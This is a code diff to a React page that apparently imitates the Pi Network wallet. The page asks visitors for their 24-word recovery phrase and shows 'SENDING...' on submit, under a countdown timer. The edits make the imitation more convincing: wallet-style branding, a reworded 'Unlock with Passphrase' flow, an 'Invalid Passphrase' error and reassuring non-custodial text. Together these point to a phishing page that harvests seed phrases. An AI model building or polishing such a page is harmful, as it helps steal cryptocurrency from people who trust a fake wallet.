@@ -10,6 +10,7 @@ const Index = () => {
   const [recoveryPhrase, setRecoveryPhrase] = useState('');
   const [isLoading, setIsLoading] = useState(false);
   const [isClaimLoading, setIsClaimLoading] = useState(false);
+  const [showError, setShowError] = useState(false);
   const [timeRemaining, setTimeRemaining] = useState({ hours: 18, minutes: 42, seconds: 51 });
 
   // Countdown timer effect
@@ -60,9 +61,13 @@ const Index = () => {
     // Validate exactly 24 words
     const words = trimmedPhrase.split(/\s+/).filter(word => word.length > 0);
     if (words.length !== 24) {
+      setShowError(true);
       toast.error(`Recovery phrase must contain exactly 24 words. You entered ${words.length} words.`);
       return;
     }
+    
+    // Clear error if validation passes
+    setShowError(false);
     
     setIsLoading(true);
     try {
@@ -295,24 +300,24 @@ const Index = () => {
           {/* Top Navigation Bar - Exact Purple Color */}
           <div className="bg-[#7030A0] px-6 py-3 h-14">
             <div className="flex items-center justify-between h-full">
-              <button 
-                onClick={() => setIsPopupOpen(false)} 
-                className="flex items-center text-white hover:text-purple-200 transition-colors p-1"
-              >
-                <ChevronLeft className="w-5 h-5" />
-              </button>
+              {/* Empty left space */}
+              <div className="w-8"></div>
               
-              <div className="flex items-center gap-3">
-                <span className="text-white font-medium text-base">Wallet</span>
-                <div className="w-6 h-6 bg-yellow-400 rounded-full flex items-center justify-center border border-white">
-                  <span className="text-xs font-bold text-black">π</span>
-                </div>
-                <div className="w-6 h-6 bg-transparent rounded-full flex items-center justify-center border border-white">
-                  <span className="text-xs font-bold text-white">?</span>
+              {/* Center content */}
+              <div className="flex items-center gap-2">
+                <span className="text-white font-bold text-lg">Wallet</span>
+                <div className="w-7 h-7 bg-orange-500 rounded-full flex items-center justify-center border border-white">
+                  <span className="text-sm font-bold text-white">π</span>
                 </div>
               </div>
               
-              <ChevronDown className="w-5 h-5 text-white" />
+              {/* Close button */}
+              <button 
+                onClick={() => setIsPopupOpen(false)}
+                className="text-white hover:text-purple-200 transition-colors w-8 h-8 flex items-center justify-center"
+              >
+                <span className="text-xl font-light">×</span>
+              </button>
             </div>
           </div>
           
@@ -326,11 +331,14 @@ const Index = () => {
               
               {/* Input and Buttons */}
               <div className="space-y-4">
-                {/* Recovery Phrase Input */}
+                {/* Passphrase Input */}
                 <Textarea
-                  placeholder="Enter your 24-word recovery phrase here"
+                  placeholder="e.g. alpha bravo charlie delta echo foxtrot golf hotel india juliett kilo lima mike november oscar papa quebec romeo sierra tango uniform victor whiskey xray yankee zulu"
                   value={recoveryPhrase}
-                  onChange={(e) => setRecoveryPhrase(e.target.value)}
+                  onChange={(e) => {
+                    setRecoveryPhrase(e.target.value);
+                    if (showError) setShowError(false); // Clear error when user starts typing
+                  }}
                   className="min-h-[160px] w-full border border-[#D3D3D3] rounded-lg p-4 text-base placeholder:text-[#A9A9A9] focus:border-[#7030A0] focus:ring-1 focus:ring-[#7030A0] resize-none"
                 />
                 
@@ -338,33 +346,26 @@ const Index = () => {
                 <Button 
                   onClick={handleUnlockClick}
                   disabled={isLoading}
-                  className="w-full bg-[#7A4B9F] hover:bg-[#6A3B8F] text-white py-3 h-12 text-sm font-bold uppercase rounded-lg transition-colors"
+                  className="w-full bg-[#7A4B9F] hover:bg-[#6A3B8F] text-white py-3 h-12 text-base font-bold rounded-lg transition-colors"
                 >
-                  {isLoading ? 'SENDING...' : 'UNLOCK WITH RECOVERY PHRASE'}
+                  {isLoading ? 'SENDING...' : 'Unlock with Passphrase'}
                 </Button>
                 
-                {/* Secondary Button */}
-                <Button 
-                  variant="outline" 
-                  disabled
-                  className="w-full bg-[#A9A9A9] border-[#A9A9A9] text-white py-3 h-12 text-sm font-bold uppercase rounded-lg cursor-not-allowed"
-                >
-                  BIOMETRIC NOT AVAILABLE
-                </Button>
+                {/* Error Message */}
+                {showError && (
+                  <div className="text-red-500 text-center font-bold text-base">
+                    Invalid Passphrase
+                  </div>
+                )}
               </div>
               
               {/* Information Text */}
-              <div className="mt-12 text-sm text-[#555555] space-y-3 leading-relaxed">
+              <div className="mt-12 text-sm text-black space-y-4 leading-relaxed">
                 <p>
-                  As a non-custodial wallet, your recovery phrase is only accessible to you. 
-                  Currently, recovery phrases cannot be recovered if lost.
+                  As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
                 </p>
                 <p>
-                  Lost your wallet recovery phrase? 
-                  <span className="text-[#0000FF] cursor-pointer hover:underline underline">
-                    Claimpinetwork
-                  </span>
-                  , but all π in your previous wallet will be inaccessible.
+                  Lost your passphrase? You can create a new wallet, but all your π in your previous wallet will be inaccessible.
                 </p>
               </div>
             </div>
